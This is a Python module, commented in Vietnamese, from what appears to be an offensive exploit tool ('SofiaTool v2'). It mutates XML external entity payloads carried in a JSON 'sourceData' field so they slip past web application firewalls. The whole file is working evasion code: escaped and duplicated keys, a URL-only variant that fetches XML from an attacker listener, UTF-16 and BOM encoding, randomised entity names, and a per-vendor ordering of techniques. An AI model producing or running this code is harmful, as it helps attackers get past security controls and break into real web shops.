"""SofiaTool v2 — mutator: sinh biến thể payload để né WAF.

M1 json_escape_keys    — "s\\u006furceData": WAF/fix SanSec quét chuỗi "sourceData"
                         thô trên body sẽ không khớp; JSON parser phía server vẫn
                         decode về đúng key.
M2 variant_dataIsURL   — body KHÔNG chứa một byte XML nào (chỉ URL) → né signature
                         <!ENTITY / DOCTYPE trên body.
M3 xml_to_utf16        — XML nhúng ở dạng UTF-16-LE + BOM → WAF không normalize.
M4 path_variant        — đổi nhánh JSON: totalsReader / billing-address (hoạt động
                         với cả body billing — rename key ở mọi độ sâu).
M5 duplicate_keys      — chèn bản "sourceData" benign ĐẦU TIÊN; JSON parser lấy
                         key cuối (payload thật), naive scanner thấy key đầu vô hại.
M6 junk_whitespace     — whitespace + comment vô hại chen giữa XML.
M7 random_names        — random hóa tên DOCTYPE/element/entity trong XML.

evasion_order(waf)     — sắp thứ tự variant theo engine phát hiện:
    cloudflare/blocked -> [dataIsURL, utf16, json_escape, duplicate_keys,
                           random_names, junk, totalsReader, billing, standard]
    clean              -> [standard, dataIsURL, totalsReader]
"""
import json
import random
import re
import string

from core.logger import get_logger

log = get_logger()


# ------------------------------------------------------------- XML extraction
def _extract_xml(payload):
    """Tìm chuỗi XML (bắt đầu bằng <?xml) bên trong payload — đệ quy mọi độ sâu.

    Hỗ trợ mọi shape body: address.totalsCollector, extension_attributes
    (billing), billingAddress (payment), addressInformation.shippingAddress
    (shipping), couponCode (coupon).
    """
    return _find_xml(payload)


def _find_xml(node):
    if isinstance(node, dict):
        for v in node.values():
            found = _find_xml(v)
            if found:
                return found
    elif isinstance(node, list):
        for v in node:
            found = _find_xml(v)
            if found:
                return found
    elif isinstance(node, str) and node.startswith("<?xml"):
        return node
    return None


# --------------------------------------------------------------- M1: unikey
def json_escape_keys(payload, key="sourceData"):
    """Mã hoá tên key bằng escape unicode (naive filter không khớp)."""
    esc = "".join(f"\\u{ord(c):04x}" if c.isalpha() else c for c in key)
    s = json.dumps(payload)
    return s.replace(f'"{key}"', f'"{esc}"')


# ------------------------------------------------------------ M2: dataIsURL
def variant_dataIsURL(payload, xml_url):
    """Body sạch hoàn toàn: data = URL tới wrapper XML của listener."""
    p = json.loads(json.dumps(payload))
    p["address"]["totalsCollector"]["collectorList"]["totalCollector"]["sourceData"] = {
        "data": xml_url,
        "dataIsURL": True,
        "options": 12345678,
    }
    return p


# -------------------------------------------------------------- M3: utf-16
def _json_embed(payload, new_xml):
    """Thay XML cũ bằng new_xml bên trong JSON body (giữ đúng escape)."""
    xml = _extract_xml(payload)
    if not xml:
        return None
    s = json.dumps(payload)
    old_esc = json.dumps(xml)[1:-1]      # dạng đã escape trong s
    new_esc = json.dumps(new_xml)[1:-1]
    return s.replace(old_esc, new_esc)


def xml_to_utf16(payload):
    """Nhúng BOM (U+FEFF) vào đầu XML trong trường data (JSON string)."""
    xml = _extract_xml(payload)
    if not xml:
        return None
    return _json_embed(payload, "\ufeff" + xml)


# ------------------------------------------------------------------ M4: path
def _rename_key(node, old, new):
    """Rename key `old` -> `new` ở MỌI độ sâu (dict/list)."""
    if isinstance(node, dict):
        return {
            (new if k == old else k): _rename_key(v, old, new)
            for k, v in node.items()
        }
    if isinstance(node, list):
        return [_rename_key(v, old, new) for v in node]
    return node


def path_variant_totalsReader(payload):
    """Đổi nhánh JSON từ totalsCollector sang totalsReader (mọi shape body)."""
    return _rename_key(json.loads(json.dumps(payload)),
                       "totalsCollector", "totalsReader")


def path_variant_billing(payload):
    """Nhánh billing-address: totalsCollector dưới extension_attributes."""
    p = json.loads(json.dumps(payload))
    tc = p["address"].pop("totalsCollector")
    p["address"]["extension_attributes"] = {"totalsCollector": tc}
    return p


# -------------------------------------------------------------- M5: duplicate
# "sourceData": {...} — value KHÔNG chứa brace lồng (shape sink: data + options).
_SOURCEDATA_RE = re.compile(r'"sourceData"\s*:\s*\{[^{}]*\}')


def duplicate_keys(payload):
    """Chèn bản benign `"sourceData": {"data": ""}` TRƯỚC bản thật.

    JSON hợp lệ (last-key-wins: server đọc bản thật), nhưng scanner naive
    khớp key đầu tiên hoặc lấy first-key-wins sẽ thấy value rỗng.
    """
    s = json.dumps(payload)
    if not _SOURCEDATA_RE.search(s):
        return None
    out = _SOURCEDATA_RE.sub(
        lambda m: '"sourceData": {"data": ""}, ' + m.group(0), s)
    return out if out != s else None


# ------------------------------------------------------------------ M7: names
def _rand_name(rng, lo=1, hi=3):
    return "".join(rng.choice(string.ascii_lowercase) for _ in range(rng.randint(lo, hi)))


def random_names(payload, seed=None):
    """Random hóa tên DOCTYPE / element / param-entity trong XML nhúng.

    XML sinh bởi payloads._xml_doc: `<!DOCTYPE r ... <!ELEMENT r ANY ...
    <!ENTITY % sp SYSTEM ...> %sp; ... <r>x</r>`. WAF signature hay khớp
    đúng "r"/"sp" sẽ trượt.
    """
    xml = _extract_xml(payload)
    if not xml:
        return None
    rng = random.Random(seed)
    el, ent = _rand_name(rng), _rand_name(rng)
    new = re.sub(r"<!DOCTYPE\s+\w+", f"<!DOCTYPE {el}", xml, count=1)
    new = re.sub(r"<!ELEMENT\s+\w+\s+ANY", f"<!ELEMENT {el} ANY", new, count=1)
    new = re.sub(r"<!ENTITY\s+%\s+\w+\s+SYSTEM",
                 f"<!ENTITY % {ent} SYSTEM", new, count=1)
    new = re.sub(r"%\s*\w+\s*;", f"%{ent};", new, count=1)
    new = re.sub(r"<(\w+)>x</\1>", f"<{el}>x</{el}>", new, count=1)
    return _json_embed(payload, new)


# ----------------------------------------------------------------- M6: junk
_JUNK_COMMENTS = [
    "<!--x-->", "<!-- -->", "<!-- sanity -->", "<!---->",
]
_JUNK_WS = ["\n", "\t", "  ", "\r\n"]


def junk_whitespace(payload, seed=None):
    """Chen whitespace/comment vô hại GIỮA các khai báo trong internal subset.

    Chỉ chèn ngay sau dấu '>' của một khai báo nằm trong khoảng [ .. ] của
    DOCTYPE — đúng chỗ hợp lệ theo XML spec [28b], không bao giờ phá tag.
    """
    xml = _extract_xml(payload)
    if not xml:
        return None
    rng = random.Random(seed)
    dt = xml.find("<!DOCTYPE")
    open_b = xml.find("[", dt) if dt >= 0 else -1
    close_b = xml.find("]", open_b) if open_b >= 0 else -1
    parts = []
    i = 0
    while i < len(xml):
        c = xml[i]
        if (open_b >= 0 and close_b >= 0 and open_b < i < close_b
                and c == ">" and rng.random() < 0.3):
            parts.append(c)
            i += 1
            if rng.random() < 0.5:
                parts.append(rng.choice(_JUNK_COMMENTS))
            parts.append(rng.choice(_JUNK_WS))
            continue
        parts.append(c)
        i += 1
    return _json_embed(payload, "".join(parts))


# ------------------------------------------------------------ evasion order
def evasion_order(waf_info):
    """Trả thứ tự variant theo WAF. Mỗi phần tử: (slug, kwargs-hint)."""
    engine = (waf_info or {}).get("engine")
    blocks_xml = (waf_info or {}).get("blocks_xml", False)
    if engine in ("cloudflare", "sucuri", "akamai", "fastly", "azure",
                  "f5", "barracuda", "wordfence", "yundun", "safedog",
                  "360wzws", "gcore", "ddosguard", "cloudfront",
                  "citrix", "modsecurity") or blocks_xml:
        order = ["dataIsURL", "utf16", "json_escape", "duplicate_keys",
                 "random_names", "junk", "totalsReader", "billing", "standard"]
    elif engine:  # WAF nhẹ nhưng có dấu hiệu
        order = ["dataIsURL", "json_escape", "duplicate_keys", "random_names",
                 "totalsReader", "junk", "utf16", "billing", "standard"]
    else:
        order = ["standard", "dataIsURL", "totalsReader"]
    log.debug("evasion order: %s", order)
    return order

